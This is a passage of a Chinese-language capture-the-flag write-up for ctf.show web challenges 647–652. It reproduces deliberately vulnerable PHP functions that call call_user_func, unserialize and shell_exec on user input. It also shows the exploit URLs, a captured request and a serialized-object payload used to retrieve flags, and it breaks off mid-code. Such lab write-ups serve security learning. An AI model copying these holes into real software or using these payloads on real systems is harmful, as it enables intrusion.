</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG648&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;mmmmm?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilNumber</span><span class=p>(</span><span class=nv>$m</span><span class=p>,</span><span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$number</span> <span class=o>=</span> <span class=nx>getArray</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>999</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$number</span><span class=p>[</span><span class=nv>$m</span><span class=p>]</span><span class=o>==</span><span class=nv>$m</span> <span class=o>&amp;&amp;</span> <span class=nv>$k</span><span class=o>==</span><span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG648&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG649&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;number is right?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilFunction</span><span class=p>(</span><span class=nv>$m</span><span class=p>,</span><span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$key</span> <span class=o>=</span> <span class=s1>&#39;ffffffff&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$content</span> <span class=o>=</span> <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span> <span class=nv>$key</span><span class=p>)</span><span class=o>!==</span><span class=k>FALSE</span> <span class=o>&amp;&amp;</span> <span class=nv>$k</span><span class=o>==</span><span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG649&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG650&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;you are not ffffffff?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilArray</span><span class=p>(</span><span class=nv>$m</span><span class=p>,</span><span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$arrays</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$arrays</span><span class=o>!==</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>array_key_exists</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>,</span> <span class=nv>$arrays</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>in_array</span><span class=p>(</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>,</span> <span class=nx>get_object_vars</span><span class=p>(</span><span class=nv>$arrays</span><span class=p>))</span> <span class=o>&amp;&amp;</span>  <span class=nv>$k</span><span class=o>==</span><span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG650&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG651&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=s1>&#39;array?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>netTest</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ret</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;code&#39;</span><span class=o>=&gt;</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=s1>&#39;message&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;命令执行失败&#39;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[A-Za-z]+$/&#39;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$res</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>stripos</span><span class=p>(</span><span class=k>PHP_OS</span><span class=p>,</span><span class=s1>&#39;WIN&#39;</span><span class=p>)</span><span class=o>!==</span><span class=k>FALSE</span><span class=o>?</span><span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=nx>iconv</span><span class=p>(</span><span class=s2>&#34;GBK&#34;</span><span class=p>,</span> <span class=s2>&#34;UTF-8&#34;</span><span class=p>,</span> <span class=nv>$res</span><span class=p>)</span><span class=o>:</span><span class=nv>$ret</span><span class=p>[</span><span class=s1>&#39;message&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$res</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilString</span><span class=p>(</span><span class=nv>$m</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$key</span> <span class=o>=</span> <span class=s1>&#39;372619038&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$content</span> <span class=o>=</span> <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span> <span class=nv>$key</span><span class=p>)</span><span class=o>!==</span><span class=k>FALSE</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG647&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;you are not 372619038?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>利用特性<code>null!=false</code>或者是<code>session_id</code>都可以解决</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/users.php?action=evilString&amp;m=getenv
</span></span></code></pre></td></tr></table></div></div><p><code>getenv</code>返回的是数组</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /system36d/users.php?action=evilString&amp;m=session_id HTTP/1.1
</span></span><span class=line><span class=cl>Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=372619038
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Sec-Fetch-Site: cross-site
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=0, i
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><h1 id=web648>web648</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilClass</span><span class=p>(</span><span class=nv>$m</span><span class=p>,</span><span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>class</span> <span class=nc>ctfshow</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>public</span> <span class=nv>$m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>public</span> <span class=k>function</span> <span class=nf>construct</span><span class=p>(</span><span class=nv>$m</span><span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=nv>$this</span><span class=o>-&gt;</span><span class=nv>$m</span><span class=o>=</span><span class=nv>$m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$ctfshow</span><span class=o>=</span><span class=k>new</span> <span class=nx>ctfshow</span><span class=p>(</span><span class=nv>$m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$ctfshow</span><span class=o>-&gt;</span><span class=nv>$m</span><span class=o>=</span><span class=nv>$m</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$ctfshow</span><span class=o>-&gt;</span><span class=nv>$m</span><span class=o>==</span><span class=nv>$m</span> <span class=o>&amp;&amp;</span> <span class=nv>$k</span><span class=o>==</span><span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG647&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG648&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;mmmmm?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}
</span></span></code></pre></td></tr></table></div></div><p>说实话这里不懂这个m是怎么回事，但是结果就是可以覆盖</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/users.php?action=evilClass&amp;m=getenv&amp;key=flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}
</span></span></code></pre></td></tr></table></div></div><h1 id=web649>web649</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilNumber</span><span class=p>(</span><span class=nv>$m</span><span class=p>,</span><span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$number</span> <span class=o>=</span> <span class=nx>getArray</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>999</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$number</span><span class=p>[</span><span class=nv>$m</span><span class=p>]</span><span class=o>==</span><span class=nv>$m</span> <span class=o>&amp;&amp;</span> <span class=nv>$k</span><span class=o>==</span><span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG648&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG649&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;number is right?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>getArray</span><span class=p>(</span><span class=nv>$total</span><span class=p>,</span> <span class=nv>$times</span><span class=p>,</span> <span class=nv>$min</span><span class=p>,</span> <span class=nv>$max</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$min</span> <span class=o>*</span> <span class=nv>$times</span> <span class=o>&gt;</span> <span class=nv>$total</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$max</span> <span class=o>*</span> <span class=nv>$times</span> <span class=o>&lt;</span> <span class=nv>$total</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=nv>$times</span> <span class=o>&gt;=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$times</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$kmix</span> <span class=o>=</span> <span class=nx>max</span><span class=p>(</span><span class=nv>$min</span><span class=p>,</span> <span class=nv>$total</span> <span class=o>-</span> <span class=nv>$times</span> <span class=o>*</span> <span class=nv>$max</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$kmax</span> <span class=o>=</span> <span class=nx>min</span><span class=p>(</span><span class=nv>$max</span><span class=p>,</span> <span class=nv>$total</span> <span class=o>-</span> <span class=nv>$times</span> <span class=o>*</span> <span class=nv>$min</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$kAvg</span> <span class=o>=</span> <span class=nv>$total</span> <span class=o>/</span> <span class=p>(</span><span class=nv>$times</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$kDis</span> <span class=o>=</span> <span class=nx>min</span><span class=p>(</span><span class=nv>$kAvg</span> <span class=o>-</span> <span class=nv>$kmix</span><span class=p>,</span> <span class=nv>$kmax</span> <span class=o>-</span> <span class=nv>$kAvg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$r</span> <span class=o>=</span> <span class=p>((</span><span class=nx>float</span><span class=p>)(</span><span class=nx>rand</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>10000</span><span class=p>)</span> <span class=o>/</span> <span class=mi>10000</span><span class=p>)</span> <span class=o>-</span> <span class=mf>0.5</span><span class=p>)</span> <span class=o>*</span> <span class=nv>$kDis</span> <span class=o>*</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$k</span> <span class=o>=</span> <span class=nx>round</span><span class=p>(</span><span class=nv>$kAvg</span> <span class=o>+</span> <span class=nv>$r</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$total</span> <span class=o>-=</span> <span class=nv>$k</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$k</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>说实话没看懂这啥玩意，不管他直接爆破或者不传值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag_649=ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}
</span></span></code></pre></td></tr></table></div></div><h1 id=web650>web650</h1><p>这里的话一个效果就是很简单，直接就搞就完事了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilFunction</span><span class=p>(</span><span class=nv>$m</span><span class=p>,</span><span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$key</span> <span class=o>=</span> <span class=s1>&#39;ffffffff&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$content</span> <span class=o>=</span> <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span> <span class=nv>$key</span><span class=p>)</span><span class=o>!==</span><span class=k>FALSE</span> <span class=o>&amp;&amp;</span> <span class=nv>$k</span><span class=o>==</span><span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG649&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG650&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;you are not ffffffff?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/users.php?action=evilFunction&amp;m=getenv&amp;key=flag_649=ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}
</span></span></code></pre></td></tr></table></div></div><h1 id=web651>web651</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>evilArray</span><span class=p>(</span><span class=nv>$m</span><span class=p>,</span><span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$arrays</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$arrays</span><span class=o>!==</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>array_key_exists</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>,</span> <span class=nv>$arrays</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>in_array</span><span class=p>(</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>,</span> <span class=nx>get_object_vars</span><span class=p>(</span><span class=nv>$arrays</span><span class=p>))</span> <span class=o>&amp;&amp;</span>  <span class=nv>$k</span><span class=o>==</span><span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG650&#39;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /FLAG/FLAG651&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=s1>&#39;array?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>username</code>为属性名<code>ctfshow</code>为属性值</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s2>&#34;ctfshow&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>A</span><span class=p>()));</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/users.php?action=evilArray&amp;m=O%3A1%3A%22A%22%3A1%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22ctfshow%22%3B%7D&amp;key=flag_650=ctfshow{5eae22d9973a16a0d37c9854504b3029}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}
</span></span></code></pre></td></tr></table></div></div><p>然后这里面就看不到了去读取其他文件</p><h1 id=web652>web652</h1><p>但是不知道文件名只能重新回去看抓包了</p><p>查看之前的<code>page.php</code>(因为现在的页面已经没有flag获取方式了)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
